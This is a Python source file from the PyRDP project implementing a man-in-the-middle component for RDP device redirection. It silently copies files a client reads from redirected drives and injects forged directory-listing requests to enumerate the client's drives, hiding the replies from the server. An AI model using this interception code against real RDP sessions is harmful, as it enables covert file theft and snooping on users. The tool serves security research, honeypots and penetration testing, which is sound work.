#
# This file is part of the PyRDP project.
# Copyright (C) 2019 GoSecure Inc.
# Licensed under the GPLv3 or later.
#

import hashlib
import json
from logging import LoggerAdapter
from pathlib import Path
from typing import Dict, List, Union

from pyrdp.core import FileProxy, ObservedBy, Observer, Subject
from pyrdp.enum import CreateOption, DeviceType, DirectoryAccessMask, FileAccessMask, FileAttributes, \
    FileCreateDisposition, FileCreateOptions, FileShareAccess, FileSystemInformationClass, IOOperationSeverity, \
    MajorFunction, MinorFunction
from pyrdp.layer import DeviceRedirectionLayer
from pyrdp.mitm.config import MITMConfig
from pyrdp.mitm.FileMapping import FileMapping, FileMappingDecoder, FileMappingEncoder
from pyrdp.pdu import DeviceAnnounce, DeviceCloseRequestPDU, DeviceCloseResponsePDU, DeviceCreateRequestPDU, \
    DeviceCreateResponsePDU, DeviceDirectoryControlResponsePDU, DeviceIORequestPDU, DeviceIOResponsePDU, \
    DeviceListAnnounceRequest, DeviceQueryDirectoryRequestPDU, DeviceQueryDirectoryResponsePDU, DeviceReadRequestPDU, \
    DeviceReadResponsePDU, DeviceRedirectionPDU


class DeviceRedirectionMITMObserver(Observer):
    def onDeviceAnnounce(self, device: DeviceAnnounce):
        pass

    def onDirectoryListingResult(self, requestID: int, deviceID: int, fileName: str, isDirectory: bool):
        pass

    def onDirectoryListingComplete(self, requestID: int):
        pass


@ObservedBy(DeviceRedirectionMITMObserver)
class DeviceRedirectionMITM(Subject):
    """
    MITM component for the device redirection channel.
    It saves files transferred over RDP to a local directory. The files aren't named after their remote name to avoid
    conflicts. Rather, they are given a random name, and the mapping to their remote path is given by the mapping.json
    file. Each unique file (identified by its hash) is saved only once. Duplicates are removed to avoid filling the drive
    with identical files.
    """

    FORGED_COMPLETION_ID = 1000000


    def __init__(self, client: DeviceRedirectionLayer, server: DeviceRedirectionLayer, log: LoggerAdapter, config: MITMConfig):
        """
        :param client: device redirection layer for the client side
        :param server: device redirection layer for the server side
        :param log: logger for this component
        :param config: MITM configuration
        """
        super().__init__()

        self.client = client
        self.server = server
        self.log = log
        self.config = config
        self.currentIORequests: Dict[int, DeviceIORequestPDU] = {}
        self.openedFiles: Dict[int, FileProxy] = {}
        self.openedMappings: Dict[int, FileMapping] = {}
        self.fileMap: Dict[str, FileMapping] = {}
        self.fileMapPath = self.config.outDir / "mapping.json"
        self.directoryListingRequests: List[int] = []
        self.directoryListingPaths: Dict[int, str] = {}
        self.directoryListingFileIDs: Dict[int, int] = {}

        self.responseHandlers: Dict[MajorFunction, callable] = {
            MajorFunction.IRP_MJ_CREATE: self.handleCreateResponse,
            MajorFunction.IRP_MJ_READ: self.handleReadResponse,
            MajorFunction.IRP_MJ_CLOSE: self.handleCloseResponse,
            MajorFunction.IRP_MJ_DIRECTORY_CONTROL: self.handleDirectoryControl,
        }

        self.client.createObserver(
            onPDUReceived=self.onClientPDUReceived,
        )

        self.server.createObserver(
            onPDUReceived=self.onServerPDUReceived,
        )

        try:
            with open(self.fileMapPath, "r") as f:
                self.fileMap: Dict[str, FileMapping] = json.loads(f.read(), cls=FileMappingDecoder)
        except IOError:
            pass
        except json.JSONDecodeError:
            self.log.error(f"Failed to decode file mapping, overwriting previous file")

    def saveMapping(self):
        """
        Save the file mapping to a file in JSON format.
        """

        with open(self.fileMapPath, "w") as f:
            f.write(json.dumps(self.fileMap, cls=FileMappingEncoder, indent=4, sort_keys=True))

    def onClientPDUReceived(self, pdu: DeviceRedirectionPDU):
        self.handlePDU(pdu, self.server)

    def onServerPDUReceived(self, pdu: DeviceRedirectionPDU):
        self.handlePDU(pdu, self.client)

    def handlePDU(self, pdu: DeviceRedirectionPDU, destination: DeviceRedirectionLayer):
        """
        Handle the logic for a PDU and send the PDU to its destination.
        :param pdu: the PDU that was received
        :param destination: the destination layer
        """
        dropPDU = False

        if isinstance(pdu, DeviceIORequestPDU) and destination is self.client:
            self.handleIORequest(pdu)
        elif isinstance(pdu, DeviceIOResponsePDU) and destination is self.server:
            dropPDU = pdu.completionID in self.directoryListingRequests
            self.handleIOResponse(pdu)

        elif isinstance(pdu, DeviceListAnnounceRequest):
            self.handleDeviceListAnnounceRequest(pdu)

        if not dropPDU:
            destination.sendPDU(pdu)

    def handleIORequest(self, pdu: DeviceIORequestPDU):
        """
        Keep track of IO requests that are active.
        :param pdu: the device IO request
        """

        self.currentIORequests[pdu.completionID] = pdu

    def handleIOResponse(self, pdu: DeviceIOResponsePDU):
        """
        Handle an IO response, depending on what kind of request originated it.
        :param pdu: the device IO response.
        """

        if pdu.completionID in self.currentIORequests:
            requestPDU = self.currentIORequests.pop(pdu.completionID)

            if pdu.ioStatus >> 30 == IOOperationSeverity.STATUS_SEVERITY_ERROR:
                self.log.warning("Received an IO Response with an error IO status: %(responsePDU)s for request %(requestPDU)s", {"responsePDU": repr(pdu), "requestPDU": repr(requestPDU)})

            if pdu.majorFunction in self.responseHandlers:
                self.responseHandlers[pdu.majorFunction](requestPDU, pdu)
        else:
            self.log.error("Received IO response to unknown request #%(completionID)d", {"completionID": pdu.completionID})

    def handleDeviceListAnnounceRequest(self, pdu: DeviceListAnnounceRequest):
        """
        Log mapped devices.
        :param pdu: the device list announce request.
        """

        for device in pdu.deviceList:
            self.log.info("%(deviceType)s mapped with ID %(deviceID)d: %(deviceName)s", {
                "deviceType": DeviceType.getPrettyName(device.deviceType),
                "deviceID": device.deviceID,
                "deviceName": device.preferredDOSName
            })

            self.observer.onDeviceAnnounce(device)

    def handleCreateResponse(self, request: DeviceCreateRequestPDU, response: DeviceCreateResponsePDU):
        """
        Prepare to intercept a file: create a FileProxy object, which will only create the file when we actually write
        to it. When listing a directory, Windows sends a lot of create requests without actually reading the files. We
        use a FileProxy object to avoid creating a lot of empty files whenever a directory is listed.
        :param request: the device create request
        :param response: the device IO response to the request
        """
        if response.completionID in self.directoryListingRequests:
            self.handleForgedDirectoryOpen(response)
            return


        isFileRead = request.desiredAccess & (FileAccessMask.GENERIC_READ | FileAccessMask.FILE_READ_DATA) != 0
        isNotDirectory = request.createOptions & CreateOption.FILE_NON_DIRECTORY_FILE != 0

        if isFileRead and isNotDirectory:
            remotePath = Path(request.path)
            mapping = FileMapping.generate(remotePath, self.config.fileDir)
            proxy = FileProxy(mapping.localPath, "wb")

            self.openedFiles[response.fileID] = proxy
            self.openedMappings[response.fileID] = mapping

            proxy.createObserver(
                onFileCreated = lambda _: self.log.info("Saving file '%(remotePath)s' to '%(localPath)s'", {
                    "localPath": mapping.localPath, "remotePath": mapping.remotePath
                }),
                onFileClosed = lambda _: self.log.debug("Closing file %(path)s", {"path": mapping.localPath})
            )


    def handleReadResponse(self, request: DeviceReadRequestPDU, response: DeviceReadResponsePDU):
        """
        Write the data that was read at the appropriate offset in the file proxy.
        :param request: the device read request
        :param response: the device IO response to the request
        """

        if request.fileID in self.openedFiles:
            file = self.openedFiles[request.fileID]
            file.seek(request.offset)
            file.write(response.payload)

            # Save the mapping permanently
            mapping = self.openedMappings[request.fileID]
            fileName = mapping.localPath.name

            if fileName not in self.fileMap:
                self.fileMap[fileName] = mapping
                self.saveMapping()

    def handleCloseResponse(self, request: DeviceCloseRequestPDU, response: DeviceCloseResponsePDU):
        """
        Close the file if it was open. Compute the hash of the file, then delete it if we already have a file with the
        same hash.
        :param request: the device close request
        :param response: the device IO response to the request
        """

        if response.completionID in self.directoryListingRequests:
            self.handleForgedDirectoryClose(response)
            return

        if request.fileID in self.openedFiles:
            file = self.openedFiles.pop(request.fileID)
            file.close()

            if file.file is None:
                return

            currentMapping = self.openedMappings.pop(request.fileID)

            # Compute the hash for the final file
            with open(currentMapping.localPath, "rb") as f:
                sha1 = hashlib.sha1()

                while True:
                    buffer = f.read(65536)

                    if len(buffer) == 0:
                        break

                    sha1.update(buffer)

                currentMapping.hash = sha1.hexdigest()

            # Check if a file with the same hash exists. If so, keep that one and remove the current file.
            for localPath, mapping in self.fileMap.items():
                if mapping is currentMapping:
                    continue

                if mapping.hash == currentMapping.hash:
                    currentMapping.localPath.unlink()
                    self.fileMap.pop(currentMapping.localPath.name)
                    break

            self.saveMapping()


    def handleDirectoryControl(self, _: Union[DeviceIORequestPDU, DeviceQueryDirectoryRequestPDU], response: Union[DeviceDirectoryControlResponsePDU, DeviceQueryDirectoryResponsePDU]):
        if response.minorFunction != MinorFunction.IRP_MN_QUERY_DIRECTORY:
            return

        if response.completionID not in self.directoryListingRequests:
            return

        if response.ioStatus == 0:
            self.handleDirectoryListingResponse(response)
        else:
            self.handleDirectoryListingComplete(response)


    def sendForgedDirectoryListing(self, deviceID: int, path: str) -> int:
        """
        Send a forged directory listing request. Returns a request ID that can be used by the caller to keep track of which
        file belongs to which directory. Results are sent by using the DeviceRedirectionMITMObserver interface.
        :param deviceID: ID of the target device.
        :param path: path of the directory to list. The path should use '\' instead of '/' to separate directories. It
        should also contain a pattern to match. For example: to list all files in the Documents folder, the path should be
        \Documents\*
        """

        completionID = DeviceRedirectionMITM.FORGED_COMPLETION_ID

        while completionID in self.directoryListingRequests:
            completionID += 1

        self.directoryListingRequests.append(completionID)
        self.directoryListingPaths[completionID] = path

        if "*" not in path:
            openPath = path
        else:
            openPath = path[: path.index("*")]

        if openPath.endswith("\\"):
            openPath = path[: -1]

        # We need to start by opening the directory.
        request = DeviceCreateRequestPDU(
            deviceID,
            0,
            completionID,
            0,
            DirectoryAccessMask.FILE_LIST_DIRECTORY,
            0,
            FileAttributes.FILE_ATTRIBUTE_DIRECTORY,
            FileShareAccess(7), # read, write, delete
            FileCreateDisposition.FILE_OPEN,
            FileCreateOptions.FILE_DIRECTORY_FILE,
            openPath
        )

        # Make sure the request is registered within our own tracking system.
        self.handleIORequest(request)
        self.client.sendPDU(request)

        return completionID

    def handleForgedDirectoryOpen(self, openResponse: DeviceCreateResponsePDU):
        if openResponse.ioStatus != 0:
            return

        self.directoryListingFileIDs[openResponse.completionID] = openResponse.fileID

        # Now that the file is open, start listing the directory.
        request = DeviceQueryDirectoryRequestPDU(
            openResponse.deviceID,
            openResponse.fileID,
            openResponse.completionID,
            FileSystemInformationClass.FileBothDirectoryInformation,
            1,
            self.directoryListingPaths[openResponse.completionID]
        )

        self.handleIORequest(request)
        self.client.sendPDU(request)

    def handleDirectoryListingResponse(self, response: DeviceQueryDirectoryResponsePDU):
        for info in response.fileInformation:
            try:
                isDirectory = info.fileAttributes & FileAttributes.FILE_ATTRIBUTE_DIRECTORY != 0
            except AttributeError:
                isDirectory = False

            self.observer.onDirectoryListingResult(response.completionID, response.deviceID, info.fileName, isDirectory)

        # Send a follow-up request to get the next file (or a nonzero ioStatus, which will complete the listing).
        pdu = DeviceQueryDirectoryRequestPDU(
            response.deviceID,
            self.directoryListingFileIDs[response.completionID],
            response.completionID,
            response.informationClass,
            0,
            ""
        )

        self.handleIORequest(pdu)
        self.client.sendPDU(pdu)

    def handleDirectoryListingComplete(self, response: DeviceQueryDirectoryResponsePDU):
        fileID = self.directoryListingFileIDs.pop(response.completionID)
        self.directoryListingPaths.pop(response.completionID)

        self.observer.onDirectoryListingComplete(response.completionID)

        # Once we're done, we can close the file.
        request = DeviceCloseRequestPDU(
            response.deviceID,
            fileID,
            response.completionID,
            0
        )

        self.handleIORequest(request)
        self.client.sendPDU(request)

    def handleForgedDirectoryClose(self, response: DeviceCloseResponsePDU):
        # The directory is closed, we can remove the request ID from the list.
        self.directoryListingRequests.remove(response.completionID)